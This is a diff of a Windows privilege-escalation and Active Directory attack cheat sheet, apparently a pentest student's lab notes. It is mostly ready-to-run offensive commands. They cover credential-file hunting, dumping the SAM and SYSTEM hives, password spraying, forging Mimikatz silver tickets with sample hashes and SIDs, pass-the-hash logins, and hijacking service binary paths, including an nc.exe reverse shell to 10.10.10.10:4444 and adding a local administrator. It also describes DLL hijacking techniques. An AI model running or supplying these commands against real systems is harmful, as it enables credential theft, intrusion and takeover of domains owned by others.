@@ -1,4 +1,4 @@
-# Windows Enumeration
+# Windows Privilege Escalation
 
 ### Initial Access
 
@@ -12,6 +12,9 @@ There are several key pieces of information we should always obtain:
 - Installed applications
 - Running processes
 
+https://github.com/lkarlslund/Adalanche/releases
+
+
 ```bash
 > powershell -ep bypass
 > whoami
@@ -20,8 +23,13 @@ There are several key pieces of information we should always obtain:
 > net user steve
 > Get-ChildItem Env: # Environment Variables
 > $env:appkey
+> $env:path
 > cd env:appkey
-> dir # Check for USERPROFILE
+> dir :env # Check for USERPROFILE
+> cmd /c echo %PATH%
+> powershell -command "Get-Clipboard"
+> Tasklist /SVC #List processes running and services
+> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 > Get-LocalUser
 > Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
 > Get-LocalGroupMember adminteam
@@ -30,13 +38,15 @@ There are several key pieces of information we should always obtain:
 # Our goal in this next step is to identify all network interfaces, routes, and active network connections. Based on this information, we may identify new services or even access to other networks. This information may not directly lead us to elevated privileges, but they are vital to understand the machine's purpose and to obtain vectors to other systems and networks.
 > ipconfig /all # Note whether DHCP is enables, the IP address, the Default Gateway, the Physical Address, subnet mask, and the DNS Servers
 > route print #  The output of this command is useful to determine possible attack vectors to other systems or networks.
-> netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
+> netstat -ano|select-string LIST # netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
 # Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
 > netsh firewall show state
 > netsh firewall show config
 # Does the computer have an unexpected public ip, internal ip.. look into it
 > arp -A # -a
-> accesschk.exe -uwcqv "Authenticated Users" *
+> accesschk.exe -uwcqv "Authenticated Users" * # Weak permissions
+> accesschk.exe -dqv "directory" # Expanded permissions
+> accesschk.exe -uwdqs "Users" c:\ /accepteula # World writable folders/files
 # How well patched is the system?
 > wmic qfe get Caption,Description,HotFixID,InstalledOn
 > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
@@ -49,20 +59,28 @@ There are several key pieces of information we should always obtain:
 > dir "C:\Users\lisa\Downloads"
 > dir /q # Use this instead of plain dir to see who owns
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
-> Get-Process
+> Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id, Path
+> get-process -Id 3324 
 > Get-Process NonStandardProcess | Select-Object Path
 > Get-Process -Name notepad | Select-Object -ExpandProperty "Path"
+> get-service \| ? {$_.DisplayName -like 'Druva*'}
 # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*.bat,*.bak,*.conf,*.vbs,*.sql,*.reg,*password*,*sensitive*,*admin*,*login*,*secret*,*.vmdk,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit,id_rsa,authorized_keys -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+> Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+# Find a string
+> get-childitem -path C:\ -ErrorAction SilentlyContinue -include *.txt,*.pdf,*.xls,*.xlsx,*.vbs,*.sql,*.reg,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*.bat,*.bak,*.conf,*cups*,*print*,*secret*,*cred*,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,*.ini -recurse | select-string -pattern *pass*,*ms01*,*ms02*,*user*,*svc*,*oscp*,username,admin,secret,cred*,key | select -unique path | format-table -hidetableheaders
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> Get-ChildItem -Path C:\Users -Include user.txt,root.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
-> findstr /i /s "*print_service*" *.txt,*.config,*.log
+> findstr /is "passwordss" *.txt *.config *.log *.xml *.docx *.xls
+> takeown /f C:\backups\wwwroot\web.config # TAKE OWNERSHIP OF A FILE
+> Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}} # CONFIRMING SUCCESS
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
 > LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
@@ -70,7 +88,14 @@ There are several key pieces of information we should always obtain:
 > setspn -L iis_service # or any server,client you discover
 > net accounts # Obtain the account policy, lockout threshold
 > mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*skylark*,*oscp*,*amsterdam*,*hint* -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+# MONEYYYYY
+> netstat -p tcp
+> netstat -p tcp -f
+> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+> wevtutil qe Security /rd:true /f:text \| Select-String "/user" #	Searching security event logs
+> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user" # Passing credentials to wevtutil
+> Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} 
 ```
 
 ### PowerView.ps1
@@ -93,10 +118,11 @@ powershell -ep bypass
 > Get-NetUser
 # Only pull down the usernames
 > Get-NetUser | select samaccountname # or select cn
+> Get-ADUser -Identity YourUsername -Properties *
 # See when the users last changed their passwords, if before policy change, may be weaker
-> Get-UserProperty -Properties pwdlastset
+> Get-UserProperty -Properties pwdlastset,logoncount
 # See how many times each user has logged on, great way to identify honeypot accounts
-> Get-UserProperty -Properties logoncount
+> Get-UserProperty -Properties *
 # See who can RDP
 > Get-NetGroupMember "Remote Desktop Users"
 # Enumerate the computer objects
@@ -136,6 +162,7 @@ powershell -ep bypass
 > nslookup.exe web04.corp.com # Typically located in C:\Tools\
 # Enumerate ACEs, filtering on an identity
 > Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID has AD Rights to SID
+> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 # Convert SIDs to domain object name
 > Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 # Clean output, look for all users with General All Rights for either a user or group object, can change permissions and change their passwords if user
@@ -149,6 +176,97 @@ powershell -ep bypass
 > Find-DomainShare # -CheckShareAccess to only display shares available to us
 > ls \\dc1.corp.com\sysvol\corp.com\
 > cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+> Get-ADUser -Identity Christopher.Lewis -Properties *
+> Get-DomainGroup -Identity "developers" -Properties * -Recurse -credential $cred
+> $SecPassword = ConvertTo-SecureString 'Nagoya2023' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('NAGOYA-IND\Christopher.Lewis', $SecPassword);
+> Get-DomainUser -Credential $Cred
+> Get-DomainGroup -Credential $Cred
+> get-domaingroup | Get-DomainGroupMember -Recurse
+> Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+> Get-DomainObjectAcl "dc=nagoya-industries,dc=com" -ResolveGUIDs -Cred $Cred | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
+# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
+> Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+```
+
+```bash
+Find-InterestingDomainShareFile -Include *passwords*
+Find-InterestingDomainAcl -ResolveGUIDs
+Find-InterestingFile 
+```
+
+### PowerSploit
+
+```bash
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+Get-RegistryAutoLogon
+Find-ProcessDLLHijack
+Find-PathDLLHijack # Write-HijackDll
+```
+
+```cmd
+# With WMIC
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+# Writable Path (accesschk.exe > upnphost)
+# Accesschk for any writable path
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
+accesschk.exe -qdws Users C:\Windows\ /accepteula
+accesschk.exe -wuvc daclsvc /accepteula
+accesschk.exe /accepteula "harey" -kvuqsw hklm\System\CurrentControlSet\services # Checking for weak service ACLs in the Registry
+```
+
+### PowerShell Scripts
+
+Last 1,000 Modified System Files.
+
+```bash
+Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Configuration Files.
+
+```bash
+Get-ChildItem -Path "C:\" -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Executables and Scripts.
+
+```bash
+Get-ChildItem -Path "C:\" -Include *.exe,*.dll,*.ps1,*.bat,*.cmd -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Files in User Profiles.
+
+```bash
+Get-ChildItem -Path "C:\Users" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Files in Program Directories.
+
+```bash
+Get-ChildItem -Path "C:\Program Files","C:\Program Files (x86)" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Comprehensive One-Liner Covering Multiple Categories.
+
+```bash
+Get-ChildItem -Path "C:\Windows","C:\Program Files","C:\Program Files (x86)","C:\Users" -Include *.config,*.ini,*.xml,*.exe,*.dll,*.ps1,*.bat,*.cmd -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Export Results to a File
+
+```bash
+Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime | Export-Csv -Path "C:\ModifiedSystemFiles.csv" -NoTypeInformation
+```
+
+Filter by Date Range: If you're interested in files modified within a specific time frame (e.g., the last 7 days):
+
+```bash
+Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge (Get-Date).AddDays(-7)} | Sort-Object LastWriteTime -Descending | Select-Object FullName, LastWriteTime
 ```
 
 ### SharpHound.ps1 && BloodHound.ps1
@@ -158,11 +276,13 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 ```bash
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "ahansen"
+> Invoke-BloodHound -CollectionMethod All,GPOLocalGroup $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "molly" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "local"
 # Or remotely
 > bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
 > python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
+> proxychains bloodhound-python -c ALL -u kevin -p 'Passw0rd' -d red.com -dc dc.red.com -ns 10.9.20.10 --dns-tcp
+> proxychains bloodhound-python3 -c ALL -u 'WEB05$@RED.COM' --hashes 00000000000000000000000000000000:d66f37fd3d677522959e5b4aeecafb78 -d COMPLYEDGE.COM  -ns 172.16.76.168 --dns-tcp (Extract NTLM from /etc/krb5cc.keytab)
 ```
 
 ```bash
@@ -249,6 +369,22 @@ Simple way to get more information about files in directory, such as who owns th
 dir /a /o /q
 ```
 
+#### Investigate Process
+
+```bash
+get-nettcpconnection | select local*,remote*,state,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
+Get-NetTCPConnection | Where-Object { $_.State -eq "LISTEN" } | select @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName)}, 127.0.0.1, 8000
+Get-Process -Id (Get-NetTCPConnection -LocalPort 8000).OwningProcess
+Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
+netstat -a -b
+```
+
+Check What Process is Running on a Port.
+
+```bash
+Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
+```
+
 #### Interesting Object Permissions
 
 AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:
@@ -332,9 +468,10 @@ schtasks /query /fo LIST /v /TN "FTP Backup"
 #### Recursively Search Through Directories (May only be in CMD)
 
 ```bash
-dir /s/b file.txt
+dir /s /b file.txt
+cmd /c "dir /s /b"
 ```
-Get-ChildItem -Path C:\ -Include "MSSQLSERVER","SQL","Server","*\?*","MSSQL16","SQLAGENT" -File -Recurse -ErrorAction SilentlyContinue
+
 #### Recursively Search a User's Workstation
 
 ```bash
@@ -344,9 +481,15 @@ Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Re
 
 #### SAM and SYSTEM Files
 
-Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystemm:
+Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem:
+They are typically located in "C:\Windows\System32\config".
 
 ```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+
 reg save hklm\security c:\security
 reg save hklm\sam c:\sam
 reg save hklm\system c:\system
@@ -379,6 +522,8 @@ samdump2 SYSTEM SAM
 
 ./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
 Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+evil-winrm -i $dc -u $user -H $hash
 ```
 
 This will provide hashes that you will be able to crack.
@@ -393,18 +538,18 @@ This will provide hashes that you will be able to crack.
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
 PS C:\Tools> type .\usernames.txt
-pete
-dave
-jen
-
 # Validate Usernames
 PS C:\Tools> .\kerbrute_windows_amd64.exe userenum -d corp.com --dc=dc1.corp.com usernames.txt
-
 # Password Spraying
 PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 
 # If NTLM is enabled, you can use crackmapexec
 kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+```bash
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
 #### AS-REP Roasting
@@ -450,12 +595,14 @@ Let's assume that we are performing an assessment and notice that we have Generi
 
 #### Silver Tickets
 
-In general, you need to collect the following three pieces of informaiton to create a sliver ticket:
+In general, you need to collect the following three pieces of informaiton to create a silver ticket:
 	1. SPN password hash
 	2. Domain SID
 	3. Target SPN
 
 If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTLM hash with codebeautify.org.
+
+You can only use silver ticket against that host.
 
 ```bash
 mimikatz # privilege::debug
@@ -472,15 +619,45 @@ User Name SID
 corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105
 
 mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
-...
-mimikatz # exit
+mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /domain:nagoya-industries.com /ptt /target:nagoya /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
+mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /ptt /target:nagoya.nagoya-industries.com /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
+mimikatz # kerberos::golden /domain: /sid: /aes128: /user:<user_name> /service: /target:
+mimikatz # kerberos::golden /domain: /sid: /aes256: /user:<user_name> /service:  /target:
+mimikatz # kerberos::ptt <ticket_kirbi_file>
+```
 
-# or
-
-ticketer.py -nthash <spn nltm hash> -domain-sid <domain sid> -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
+```bash
+ticketer.py -nthash  -domain-sid -domain -spn TotesLegit/dc.sequel.htb administrator
+ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain $dom -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
 KRB5CCNAME=administrator.ccache mssqlclient.py  -k administrator@dc.sequel.htb
+KRB5CCNAME=Administrator.ccache mssqlclient.py  -k Administrator@nagoya.nagoya-industries.com
 > enable_xp_cmdshell
 > xp_cmdshell whoami
+```
+
+You may need to create a /etc/krb5user.conf file.
+
+```bash
+┌──(kali㉿kali)-[~/practice/nagoya]
+└─$ cat /etc/krb5user.conf
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
 ```
 
 We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:
@@ -708,9 +885,20 @@ The icacls utility outputs the corresponding principals and their permission mas
 	R 	Read-only access
 	W 	Write-only access
 
+Privileges can be escalated through various permissions:
+
+    SERVICE_CHANGE_CONFIG: Allows reconfiguration of the service binary.
+    WRITE_DAC: Enables permission reconfiguration, leading to the ability to change service configurations.
+    WRITE_OWNER: Permits ownership acquisition and permission reconfiguration.
+    GENERIC_WRITE: Inherits the ability to change service configurations.
+    GENERIC_ALL: Also inherits the ability to change service configurations.
+
+
 ```bash
 icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```
+
+If Auto is the Start Mode, you can restart the service if you can reboot the computer.
 
 ### Elevate Priviledges of Running Service Binary
 
@@ -782,9 +970,11 @@ whoami /priv
 If you have the SeShutDownPrivilege, then restart the computer. 
 
 ```bash
-shutdown /r /t 0
+shutdown /r /t 0 /f
 # as alternative
-shutdown -r -t 1
+shutdown -r -t 1 /f
+# powershell
+Restart-Computer -Force
 ```
 
 Once you're back, confirm that everything went as planned.
@@ -811,8 +1001,53 @@ powershell -ep bypass
 . .\PowerUp.ps1
 
 # This function displays services the current user can modify, such as the service binary or configuration files.
-Get-ModifiableServiceFile
-Invoke-AllChecks
+Get-ModifiableServiceFile -Verbose
+Invoke-AllChecks -Verbose
+```
+
+```bash
+ipmo .\powerup.ps1
+invoke-allchecks
+sc qc vuln
+sc config vuln start= demand  //Change start type
+sc config vuln obj= "NT AUTHORITY\SYSTEM"  //Change owner
+sc config SSDPSRV obj= ".\LocalSystem" password= "" // Or This
+sc.exe config usosvc start= auto // Or this
+Invoke-serviceabuse -name 'vuln' -username 'red\alice'  //Abuse
+```
+
+#### Enable service
+
+If you are having this error (for example with SSDPSRV):
+
+System error 1058 has occurred.
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+
+You can enable it using:
+
+```bash
+sc config vuln obj= "NT AUTHORITY\SYSTEM"  //Change owner
+sc config SSDPSRV obj= ".\LocalSystem" password= "" // Or This
+sc.exe config usosvc start= auto // Or this
+```
+
+#### Modify service binary path
+
+In the scenario where the "Authenticated users" group possesses SERVICE_ALL_ACCESS on a service, modification of the service's executable binary is possible. To modify and execute sc:
+
+```bash
+sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config <Service_Name> binpath= "net localgroup administrators username /add"
+sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+
+sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
+```
+
+#### Restart Service
+
+```bash
+wmic service NAMEOFSERVICE call startservice
+net stop [service name] && net start [service name]
 ```
 
 #### Path Injection
@@ -821,35 +1056,90 @@ If you see any instance where a script or a cronjob does not specify the full pa
 
 ### Service DLL Hijacking
 
-Identifying.
+DLL Replacement.
+Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
+
+DLL Search Order Hijacking:
+Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
+
+Phantom DLL Hijacking. (If manual path entry that points to writable directory)
+Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
+
+DLL Redirection:
+Modifying search parameters like %PATH% or .exe.manifest / .exe.local files to direct the application to the malicious DLL.
+
+WinSxS DLL Replacement:
+Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
+
+Relative Path DLL Hijacking:
+Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.
+
+NOTE: Some processes are run as NT AUTHORITY\LOCAL SERVICE, so try a reverse shell if creating user doesn't work. Once you have a shell, abuse NT AUTHORITY\LOCAL SERVICE SeImpersonatePrivilege.
+
+Identifying unusual processes.
 
 ```bash
 # Check what binaries are running, as before
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-CimInstance -ClassName win32_service | Select * | Where-Object {$_.State -like 'Running'}
 # Check for permissions on the binary if you find an interesting one
 icacls .\Documents\BetaServ.exe
 ```
 
+Found unusual process.
+
 ```bash
-To identify and restart services using a specific DLL file on Windows, you can follow these steps:
- 1 Identify the Services:
+To identify and restart services using a specific DLL file on Windows:
+1 Identify the Services:
     • Open Command Prompt as Administrator.
-    • Use the tasklist /m wlbsctrl.dll command to list all processes using the  
-      wlbsctrl.dll file.
- 2 Find Service Names:
-    • For each process identified, use sc query type= service state= all |    
-      find /i "PROCESS_NAME" to find the corresponding service name, replacing  
-      PROCESS_NAME with the actual process name.                                
- 3 Restart Services:
-    • Once you have the service names, use net stop "ServiceName" followed by   
-      net start "ServiceName" for each service, replacing "ServiceName" with the
-      actual name of the service you want to restart.     
+    • Use the tasklist /m wlbsctrl.dll command to list all processes using the wlbsctrl.dll file.
+2 Find Service Names:
+    • For each process identified, use ` sc query type= service state= all | find /i "PROCESS_NAME" ` to find the corresponding service name, replacing PROCESS_NAME with the actual process name.                                
+3 Restart Services:
+    • Once you have the service names, use net stop "ServiceName" followed by net start "ServiceName" for each service, replacing "ServiceName" with the actual name of the service you want to restart.     
+```
+
+```bash
 sc query | findstr /i "auditTracker"
 sc query | findstr /i "SQLSERVERAGENT"
 sc qc <ServiceName> | findstr /i "BINARY_PATH_NAME"
 net stop <ServiceName> && net start <ServiceName>
 sc stop <ServiceName> && sc start <ServiceName>
-````
+sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
+whoami /priv #if the above failed check to see if you have shutdown privledges
+stop-Service <ServiceName>
+Start-Service <ServiceName>
+Start-Process <ServiceName>
+Stop-Process <ServiceName>
+Restart-Service <ServiceName>
+shutdown /r /t 0 /f # force that bih
+# as alternative
+shutdown -r -t 1 /f
+# powershell
+Restart-Computer -Force
+```
+
+#### Checking for permissions of all folders inside PATH (how to modify for any path)
+
+for group in $(whoami /groups); put group in command
+
+```bash
+for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
+```
+
+```bash
+$SpecificPath = "C:\fakepath"
+
+$output = icacls $SpecificPath 2>$null | Select-String -Pattern "(F) (M) (W) :\" | Select-String -Pattern ":\\ everyone authenticated users todos $env:username"
+if ($output) { Write-Output "`n" }
+```
+
+You can also check the imports of an executable and the exports of a dll with:
+
+```bash
+dumpbin /imports C:\path\Tools\putty\Putty.exe
+dumpbin /export /path/file.dll
+```
+
 If you have read and execute permissions (RX), then see if there is a missing DLL for the binary.
 
 You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.
